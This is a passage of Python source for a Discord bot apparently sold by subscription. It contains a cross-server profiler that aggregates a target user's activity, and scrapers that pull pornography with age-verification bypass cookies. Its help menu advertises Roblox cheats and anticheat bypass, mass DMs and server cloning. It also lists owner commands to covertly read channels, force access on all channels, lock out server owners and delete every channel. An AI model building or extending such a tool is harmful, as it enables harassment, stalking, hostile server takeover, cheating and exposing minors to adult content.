        roles = ", ".join(r.name for r in member.roles if r.name != "@everyone")
        lines.append(f"  {member} | id:{member.id} | roles:[{roles}]")
    content = "\n".join(lines)
    file = discord.File(fp=io.BytesIO(content.encode()), filename=f"backup_{guild.id}_{datetime.utcnow().strftime('%Y%m%d')}.txt")
    await ctx.send(f"✓ backup of `{guild.name}`", file=file)


@bot.command(name="profiler")
@has_sub("tools")
async def profiler(ctx: commands.Context, user_id: int):
    profile_data = []
    for guild in bot.guilds:
        member = guild.get_member(user_id)
        if not member:
            continue
        profile_data.append({
            "guild": guild.name, "nick": member.nick,
            "roles": [r.name for r in member.roles if r.name != "@everyone"],
            "joined": member.joined_at.strftime("%Y-%m-%d") if member.joined_at else "unknown",
            "status": str(member.status)
        })
    if not profile_data:
        await ctx.send(f"user `{user_id}` not found in any shared server."); return
    try:
        user = await bot.fetch_user(user_id)
    except discord.NotFound:
        await ctx.send("user not found."); return
    embed = discord.Embed(title=f"Profile — {user}", color=0x2b2d31)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="User ID", value=str(user_id))
    embed.add_field(name="Created", value=user.created_at.strftime("%Y-%m-%d"))
    embed.add_field(name="Shared Servers", value=str(len(profile_data)))
    for entry in profile_data[:5]:
        embed.add_field(name=entry["guild"], value=f"nick: {entry['nick'] or 'none'}\njoined: {entry['joined']}\nroles: {', '.join(entry['roles'][:5]) or 'none'}\nstatus: {entry['status']}", inline=True)
    if len(profile_data) > 5:
        embed.set_footer(text=f"...and {len(profile_data)-5} more servers")
    await ctx.send(embed=embed)


_raidwatch_guilds: set[int] = set()
_join_log: dict[int, list[float]] = {}

@bot.event
async def on_member_join(member: discord.Member):
    import time
    guild_id = member.guild.id
    if guild_id not in _raidwatch_guilds:
        return
    now = time.time()
    _join_log.setdefault(guild_id, []).append(now)
    _join_log[guild_id] = [t for t in _join_log[guild_id] if now - t < 60]
    if len(_join_log[guild_id]) >= 10:
        home = bot.get_guild(HOME_GUILD_ID)
        if home:
            for channel in home.text_channels:
                if channel.permissions_for(home.me).send_messages:
                    await channel.send(f"🚨 **RAID ALERT** — `{member.guild.name}` — `{len(_join_log[guild_id])}` joins in 60s")
                    break


@bot.command(name="raidwatch")
@has_sub("tools")
async def raidwatch(ctx: commands.Context, guild_id: int, toggle: str):
    guild = bot.get_guild(guild_id)
    if not guild:
        await ctx.send("guild not found."); return
    if toggle.lower() == "on":
        _raidwatch_guilds.add(guild_id)
        await ctx.send(f"✓ raid watch ON — `{guild.name}`")
    elif toggle.lower() == "off":
        _raidwatch_guilds.discard(guild_id)
        _join_log.pop(guild_id, None)
        await ctx.send(f"✓ raid watch OFF — `{guild.name}`")
    else:
        await ctx.send("use `on` or `off`")


# ══════════════════════════════════════════════════════════════════════════════
#  IMAGE / VIDEO SEARCH
# ══════════════════════════════════════════════════════════════════════════════

def _r34_random_pid(pool: int = 200) -> int:
    pages = pool // 100
    return random.randint(0, max(0, pages - 1)) * 100


def _r34_search(tags: str, limit: int = 100, pid: int = 0) -> list[dict]:
    url = f"https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&limit={limit}&pid={pid}&tags={urllib.parse.quote(tags)}"
    req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=10) as r:
        data = json.loads(r.read().decode("utf-8"))
    return data if isinstance(data, list) else []


def search_images(query: str, max_results: int = 1) -> list[dict]:
    pool_size = min(max_results * 3, 100)
    results: list[dict] = []

    try:
        pid = _r34_random_pid(500)
        posts = []
        for tags in [query.replace(' ', '_'), query.replace(' ', '_') + " sort:score", query.replace(' ', '_').split('_')[0]]:
            posts = _r34_search(tags, limit=pool_size, pid=pid)
            if posts: break
        image_posts = [p for p in posts if p.get("file_url") and not p["file_url"].endswith((".mp4", ".webm"))]
        random.shuffle(image_posts)
        for post in image_posts[:pool_size]:
            results.append({"image": post["file_url"], "title": query, "source": f"https://rule34.xxx/index.php?page=post&s=view&id={post.get('id','')}"})
        if len(results) >= max_results:
            return random.sample(results, min(max_results, len(results)))
    except Exception:
        pass

    if len(results) < max_results:
        try:
            pid = random.randint(0, 20)
            posts = []
            for tags in [query.replace(' ', '_'), query.replace(' ', '_').split('_')[0]]:
                url = f"https://gelbooru.com/index.php?page=dapi&s=post&q=index&json=1&limit={pool_size}&pid={pid}&tags={urllib.parse.quote(tags)}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=10) as r:
                    data = json.loads(r.read().decode("utf-8"))
                posts = data.get("post", []) if isinstance(data, dict) else (data if isinstance(data, list) else [])
                if posts: break
            image_posts = [p for p in posts if p.get("file_url") and not p["file_url"].endswith((".mp4", ".webm"))]
            random.shuffle(image_posts)
            for post in image_posts[:pool_size]:
                results.append({"image": post["file_url"], "title": query, "source": f"https://gelbooru.com/index.php?page=post&s=view&id={post.get('id','')}"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://xhamster.com/search/{urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Referer": "https://xhamster.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            thumbs = re.findall(r'"thumbURL"\s*:\s*"(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'src="(https?://[^"]+xhcdn\.com[^"]+\.(?:jpg|jpeg|png|webp))"', body)
            titles = re.findall(r'"title"\s*:\s*"([^"]{5,120})"', body)
            random.shuffle(thumbs)
            for i, t in enumerate(thumbs[:pool_size]):
                results.append({"image": t, "title": html.unescape(titles[i]) if i < len(titles) else query, "source": "https://xhamster.com"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
            thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
            titles = re.findall(r'title="([^"]{5,100})"', body)
            random.shuffle(thumbs)
            for i, t in enumerate(thumbs[:pool_size]):
                results.append({"image": t, "title": html.unescape(titles[i]) if i < len(titles) else query, "source": "https://www.pornhub.com"})
        except Exception:
            pass

    return random.sample(results, min(max_results, len(results))) if results else []


def search_videos(query: str, max_results: int = 1) -> list[dict]:
    pool_size = min(max_results * 5, 100)
    results: list[dict] = []

    try:
        pid = _r34_random_pid(500)
        posts = _r34_search(query.replace(' ', '_'), limit=pool_size, pid=pid)
        video_posts = [p for p in posts if p.get("file_url") and p["file_url"].endswith((".mp4", ".webm"))]
        random.shuffle(video_posts)
        for post in video_posts[:pool_size]:
            results.append({"video": post["file_url"], "preview": post.get("preview_url"), "title": query, "source": f"https://rule34.xxx/index.php?page=post&s=view&id={post.get('id','')}"})
        if len(results) >= max_results:
            return random.sample(results, min(max_results, len(results)))
    except Exception:
        pass

    if len(results) < max_results:
        try:
            url = f"https://www.pornhub.com/video/search?search={urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1", "Referer": "https://www.pornhub.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            vkeys = re.findall(r'href="/view_video\.php\?viewkey=([a-z0-9]+)"', body)
            thumbs = re.findall(r'data-mediumthumb="(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'(https?://[^"\s]+phncdn\.com[^"\s]+\.(?:jpg|jpeg|png|webp))', body)
            thumbs = [t for t in thumbs if not BAD_THUMB.search(t)]
            titles = re.findall(r'title="([^"]{5,100})"', body)
            paired = list(zip(vkeys, thumbs, titles)) if titles else list(zip(vkeys, thumbs, [query]*len(vkeys)))
            random.shuffle(paired)
            seen: set[str] = set()
            for vk, thumb, title in paired[:pool_size]:
                if vk in seen: continue
                seen.add(vk)
                results.append({"video": None, "page_link": f"https://www.pornhub.com/view_video.php?viewkey={vk}", "preview": thumb, "title": html.unescape(title), "source": "https://www.pornhub.com"})
        except Exception:
            pass

    if len(results) >= max_results:
        return random.sample(results, min(max_results, len(results)))

    if len(results) < max_results:
        try:
            url = f"https://xhamster.com/search/{urllib.parse.quote(query)}"
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept-Language": "en-US,en;q=0.9", "Referer": "https://xhamster.com/"})
            with urllib.request.urlopen(req, timeout=15) as r:
                body = r.read().decode("utf-8", errors="ignore")
            links = re.findall(r'"pageURL"\s*:\s*"(https?://xhamster\.com/videos/[^"]+)"', body)
            thumbs = re.findall(r'"thumbURL"\s*:\s*"(https?://[^"]+\.(?:jpg|jpeg|png|webp))"', body) or re.findall(r'src="(https?://[^"]+xhcdn\.com[^"]+\.(?:jpg|jpeg|png|webp))"', body)
            titles = re.findall(r'"title"\s*:\s*"([^"]{5,120})"', body)
            paired = list(zip(links, thumbs, titles)) if titles else list(zip(links, thumbs, [query]*len(links)))
            random.shuffle(paired)
            for link, thumb, title in paired[:pool_size]:
                results.append({"video": None, "page_link": link, "preview": thumb, "title": html.unescape(title), "source": "https://xhamster.com"})
        except Exception:
            pass

    return random.sample(results, min(max_results, len(results))) if results else []


async def _resolve_direct_url(page_url: str) -> str | None:
    try:
        proc = await asyncio.create_subprocess_exec(
            YT_DLP, "--get-url", "--no-playlist",
            "--format", "best[ext=mp4][filesize<23M]/best[filesize<23M]/best",
            "--no-warnings", "--quiet", page_url,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )
        stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=30)
        url = stdout.decode().strip().split("\n")[0]
        return url if url.startswith("http") else None
    except Exception:
        return None


async def _send_video_inline(
    ctx: commands.Context,
    source_url: str,
    page_url: str | None,
    title: str,
    query: str,
    preview_thumb: str | None = None,
) -> None:
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
        "Referer": "https://www.pornhub.com/",
        "Cookie": "accessAgeDisclaimerPH=1; platform=pc; age_verified=1",
    }
    downloaded = None
    ext = "mp4"

    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(source_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                if resp.status == 200:
                    ct = resp.headers.get("Content-Type", "").lower()
                    if "webm" in ct:
                        ext = "webm"
                    elif "mp4" in ct or "video" in ct:
                        ext = "mp4"
                    elif source_url.split("?")[0].endswith(".webm"):
                        ext = "webm"
                    else:
                        ext = "mp4"

                    chunks, total = [], 0
                    async for chunk in resp.content.iter_chunked(512 * 1024):
                        total += len(chunk)
                        if total > DISCORD_FILE_LIMIT:
                            downloaded = None
                            break
                        chunks.append(chunk)
                    else:
                        downloaded = b"".join(chunks)
    except Exception:
        downloaded = None

    safe_name = re.sub(r'[^\w\-]', '_', query)[:40]
    filename = f"{safe_name}.{ext}"

    if downloaded:
        link = page_url or source_url
        await ctx.send(
            content=link,
            file=discord.File(fp=io.BytesIO(downloaded), filename=filename)
        )
        return

    link = page_url or source_url or ""
    embed = discord.Embed(title=title or query, url=link if link else None, color=0x2b2d31)
    if preview_thumb:
        embed.set_image(url=preview_thumb)
    embed.set_footer(text="file too large — click title to watch")
    await ctx.send(content=link, embed=embed)


async def _handle_video_result(ctx: commands.Context, r: dict, query: str) -> None:
    title = r.get("title") or query
    if r.get("video"):
        await _send_video_inline(ctx, source_url=r["video"], page_url=r.get("source"), title=title, query=query, preview_thumb=r.get("preview"))
        return
    if r.get("page_link"):
        page_url = r["page_link"]
        status = await ctx.send("⏳ fetching video...")
        direct = await _resolve_direct_url(page_url)
        try:
            await status.delete()
        except discord.HTTPException:
            pass
        if direct:
            await _send_video_inline(ctx, source_url=direct, page_url=page_url, title=title, query=query, preview_thumb=r.get("preview"))
        else:
            embed = discord.Embed(title=title, url=page_url, color=0x2b2d31)
            if r.get("preview"):
                embed.set_image(url=r["preview"])
            embed.set_footer(text=r.get("source", ""))
            await ctx.send(content=page_url, embed=embed)
        return
    await ctx.send(f"no playable source for `{query}`")


@bot.command(name="image")
@has_sub("media")
async def image_single(ctx: commands.Context, *, query: str):
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, 1)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    r = results[0]
    if r.get("image"):
        embed = discord.Embed(color=0x2b2d31)
        embed.set_image(url=r["image"])
        await ctx.send(embed=embed)


@bot.command(name="images")
@has_sub("media")
async def image_multi(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 12))
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🔍 `{query}` — {len(results)} image(s)")
    for r in results:
        if r.get("image"):
            embed = discord.Embed(color=0x2b2d31)
            embed.set_image(url=r["image"])
            await ctx.send(embed=embed)


@bot.command(name="imagesave")
@has_sub("media")
async def image_save(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 6))
    async with ctx.typing():
        results = await asyncio.to_thread(search_images, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🔍 downloading {len(results)} image(s)...")
    async with aiohttp.ClientSession(headers={"User-Agent": "Mozilla/5.0"}) as session:
        for i, r in enumerate(results, 1):
            url = r.get("image")
            if not url: continue
            try:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    if resp.status != 200:
                        await ctx.send(f"result {i} — HTTP {resp.status}"); continue
                    data = await resp.read()
                ct = resp.headers.get("Content-Type", "")
                ext = "png" if "png" in ct else "gif" if "gif" in ct else "webp" if "webp" in ct else "jpg"
                await ctx.send(file=discord.File(fp=io.BytesIO(data), filename=f"{query.replace(' ','_')}_{i}.{ext}"))
            except Exception as e:
                await ctx.send(f"result {i} — `{e}`")


@bot.command(name="video")
@has_sub("media")
async def video_single(ctx: commands.Context, *, query: str):
    async with ctx.typing():
        results = await asyncio.to_thread(search_videos, query, 1)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await _handle_video_result(ctx, results[0], query)


@bot.command(name="videos")
@has_sub("media")
async def video_multi(ctx: commands.Context, count: int, *, query: str):
    count = max(1, min(count, 6))
    async with ctx.typing():
        results = await asyncio.to_thread(search_videos, query, count)
    if not results:
        await ctx.send(f"no results for `{query}`"); return
    await ctx.send(f"🎬 `{query}` — resolving {len(results)} video(s)...")
    for r in results:
        await _handle_video_result(ctx, r, query)


@bot.command(name="imgsearch")
@commands.is_owner()
@home_only()
async def img_debug(ctx: commands.Context, *, query: str):
    await ctx.send("🔍 testing sources...")
    for name, url_str in [
        ("rule34", f"https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1&limit=1&tags={urllib.parse.quote(query.replace(' ','_'))}"),
        ("gelbooru", f"https://gelbooru.com/index.php?page=dapi&s=post&q=index&json=1&limit=1&tags={urllib.parse.quote(query.replace(' ','_'))}"),
    ]:
        try:
            req = urllib.request.Request(url_str, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read().decode("utf-8"))
            posts = data if isinstance(data, list) else data.get("post", [])
            if posts:
                await ctx.send(f"{name} ✓ — `{posts[0].get('file_url','none')[:120]}`")
            else:
                await ctx.send(f"{name} ✓ but empty for `{query}`")
        except Exception as e:
            await ctx.send(f"{name} ✗ — `{e}`")
    ytdlp_path = shutil.which("yt-dlp")
    await ctx.send(f"yt-dlp ✓ — `{ytdlp_path}`" if ytdlp_path else "yt-dlp ✗ — not found")


# ══════════════════════════════════════════════════════════════════════════════
#  HELP — restructured with full syntax examples
# ══════════════════════════════════════════════════════════════════════════════

@bot.command(name="cmds")
async def show_commands(ctx: commands.Context):
    is_owner = ctx.author.id == OWNER_ID
    sub = subscriptions.get(ctx.author.id)
    now = datetime.now(timezone.utc)
    tier = sub["tier"] if sub and sub["expires"] > now else None
    order = {"media": 0, "roblox": 1, "tools": 2}
    tier_rank = order.get(tier, -1)

    # ── page 1: public + subscribed features ──────────────────────────────────
    embed1 = discord.Embed(title="SLEATH — commands (1/2)", color=0x2b2d31)

    embed1.add_field(name="── 🔓 public ──", value=(
        "`!plans` — show subscription tiers + prices\n"
        "`!redeem <token>` — activate a subscription token\n"
        "`!mysub` — check your active subscription"
    ), inline=False)

    if tier_rank >= 0 or is_owner:
        embed1.add_field(name="── 📸 media tier ──", value=(
            "`!image <query>` — 1 image\n"
            "  e.g. `!image bunny suit`\n\n"
            "`!images <count> <query>` — up to 12 images\n"
            "  e.g. `!images 5 bunny suit`\n\n"
            "`!imagesave <count> <query>` — download + re-upload up to 6\n"
            "  e.g. `!imagesave 3 bunny suit`\n\n"
            "`!video <query>` — 1 video, plays inline\n"
            "  e.g. `!video threesome`\n\n"
            "`!videos <count> <query>` — up to 6 videos\n"
            "  e.g. `!videos 3 threesome`"
        ), inline=False)

    if tier_rank >= 1 or is_owner:
        embed1.add_field(name="── 🎮 roblox tier — movement ──", value=(
            "`!rbxfly` — fly script (F to toggle)\n"
            "`!rbxspeed` — speed hack (G to toggle, Shift for 2x)\n"
            "`!rbxinfjump` — infinite jump (H to toggle)\n"
            "`!rbxnoclip` — walk through walls (N to toggle)\n"
            "`!rbxantigravity` — low gravity (M to toggle)\n"
            "`!rbxwallhop` — bunny hop (V to toggle)\n"
            "`!rbxspeedvault` — speed burst on jump (, to enable)"
        ), inline=False)

        embed1.add_field(name="── 🎮 roblox tier — combat ──", value=(
            "`!rbxaimbot` — silent aimbot (J to toggle, U for FOV)\n"
            "`!rbxesp` — see players through walls\n"
            "`!rbxkillaura` — damage nearby players (' to toggle)\n"
            "`!rbxhitbox` — expand enemy hitboxes (; to toggle)\n"
            "`!rbxreachextend` — extend melee reach (R to toggle)\n"
            "`!rbxcamlock` — lock camera on nearest player (Q to toggle)"
        ), inline=False)

        embed1.add_field(name="── 🎮 roblox tier — utility + info ──", value=(
            "`!rbxgodmode` — no health loss (P to toggle)\n"
            "`!rbxfullbright` — remove all darkness (L to toggle)\n"
            "`!rbxantivoid` — auto-return from void (always active)\n"
            "`!rbxautoclick` — 20 CPS auto clicker (X to toggle)\n"
            "`!rbxautofarm` — auto attack nearest NPC (O to toggle)\n"
            "`!rbxteleport` — teleport to nearest player (K)\n"
            "`!rbxbringplayer` — pull nearest player to you (B)\n"
            "`!rbxplayerlist` — list all players + stats (Tab)\n"
            "`!rbxchatspy` — log all chat to output (always active)\n"
            "`!rbxspinhack` — spin your character (Z to toggle)\n"
            "`!rbxchesthop` — auto-loot all chests (C)\n"
            "`!rbxanticheatbypass` — hide edits from scanners\n"
            "`!rbxcustomgui` — draggable keybind panel (+ to expand)"
        ), inline=False)

    if tier_rank >= 2 or is_owner:
        embed1.add_field(name="── ⚙️ tools tier ──", value=(
            "`!massdm <guild_id> <message>` — DM every member\n"
            "  e.g. `!massdm 123456789 hello everyone`\n\n"
            "`!cloneserver <guild_id>` — clone a server's structure\n"
            "  e.g. `!cloneserver 123456789`\n\n"
            "`!backup <guild_id>` — save roles + channels to file\n"
            "  e.g. `!backup 123456789`\n\n"
            "`!profiler <user_id>` — aggregate user across servers\n"
            "  e.g. `!profiler 987654321`\n\n"
            "`!raidwatch <guild_id> <on|off>` — alert on join spikes\n"
            "  e.g. `!raidwatch 123456789 on`"
        ), inline=False)

    await ctx.send(embed=embed1)

    # ── page 2: owner commands (only sent to owner) ────────────────────────────
    if not is_owner:
        return

    embed2 = discord.Embed(title="SLEATH — owner commands (2/2)", color=0x2b2d31)

    embed2.add_field(name="── 🔍 server info ──", value=(
        "`!servers` — list all guilds the bot is in\n"
        "`!serverinfo <guild_id>` — detailed info on a guild\n"
        "  e.g. `!serverinfo 123456789`\n"
        "`!channels <guild_id>` — list text channels + IDs\n"
        "`!members <guild_id>` — list first 20 members\n"
        "`!roles <guild_id>` — list roles + IDs"
    ), inline=False)

    embed2.add_field(name="── 📢 messaging ──", value=(
        "`!say <channel_id> <message>` — send message to any channel\n"
        "  e.g. `!say 123456789 hello there`\n"
        "`!announce <message>` — broadcast to all guilds\n"
        "  e.g. `!announce server maintenance soon`"
    ), inline=False)

    embed2.add_field(name="── 🔨 moderation ──", value=(
        "`!kick <guild_id> <user_id> [reason]` — kick a member\n"
        "  e.g. `!kick 123456789 987654321 spamming`\n"
        "`!ban <guild_id> <user_id> [reason]` — ban a member\n"
        "  e.g. `!ban 123456789 987654321 raiding`\n"
        "`!unban <guild_id> <user_id>` — unban a member\n"
        "`!nick <guild_id> <user_id> <nickname>` — change nickname\n"
        "  e.g. `!nick 123456789 987654321 NewName`\n"
        "`!slowmode <channel_id> <seconds>` — set slowmode\n"
        "  e.g. `!slowmode 123456789 10`"
    ), inline=False)

    embed2.add_field(name="── 👤 role management ──", value=(
        "`!addrole <guild_id> <user_id> <role_id>` — add role\n"
        "  e.g. `!addrole 123456789 987654321 111222333`\n"
        "`!removerole <guild_id> <user_id> <role_id>` — remove role\n"
        "`!makerole <guild_id> <user_id> <role_name>` — create + assign\n"
        "  e.g. `!makerole 123456789 987654321 VIP`\n"
        "`!stripall <guild_id> <user_id>` — remove all roles\n"
        "  e.g. `!stripall 123456789 987654321`"
    ), inline=False)

    embed2.add_field(name="── 🗑️ message management ──", value=(
        "`!delete <channel_id> <message_id>` — delete one message\n"
        "  e.g. `!delete 123456789 999888777`\n"
        "`!purge <channel_id>` — wipe ALL messages in a channel\n"
        "  e.g. `!purge 123456789`"
    ), inline=False)

    embed2.add_field(name="── 📖 channel reader ──", value=(
        "`!read <channel_id>` — relay last 50 messages\n"
        "  e.g. `!read 123456789`\n"
        "`!read <channel_id> <limit>` — relay up to 200 messages\n"
        "  e.g. `!read 123456789 100`\n"
        "`!openall <guild_id>` — force-inject read access on all channels\n"
        "  e.g. `!openall 123456789`"
    ), inline=False)

    embed2.add_field(name="── 🔎 user search ──", value=(
        "`!finduser <name>` — search for a user across all servers\n"
        "  e.g. `!finduser john`\n"
        "`!finduserhere <guild_id> <name>` — search in one server\n"
        "  e.g. `!finduserhere 123456789 john`"
    ), inline=False)

    embed2.add_field(name="── ⚡ server control ──", value=(
        "`!completecontrol <guild_id>` — cage everyone including owner\n"
        "  e.g. `!completecontrol 123456789`\n"
        "`!killswitch <guild_id>` — restore everything back to normal\n"
        "  e.g. `!killswitch 123456789`\n"
        "`!nuke <guild_id>` — delete every channel in a server\n"
        "  e.g. `!nuke 123456789`\n"
        "`!leave <guild_id>` — bot leaves a server\n"
        "  e.g. `!leave 123456789`\n"
        "`!invite` — generate bot invite link"
    ), inline=False)

    embed2.add_field(name="── 💳 subscription management ──", value=(
        "`!gentoken <tier> <days>` — generate a subscription token\n"
        "  e.g. `!gentoken media 7` or `!gentoken roblox 14` or `!gentoken tools 30`\n"
        "`!listsubs` — list all active subscriptions\n"
        "`!revoke <user_id>` — cancel a user's subscription\n"
        "  e.g. `!revoke 987654321`"
    ), inline=False)

    embed2.add_field(name="── 🛠️ debug ──", value=(
        "`!imgsearch <query>` — test image sources + yt-dlp status\n"
        "  e.g. `!imgsearch bunny suit`"
    ), inline=False)

    await ctx.send(embed=embed2)


# ── run ────────────────────────────────────────────────────────────────────────
bot.run(TOKEN)
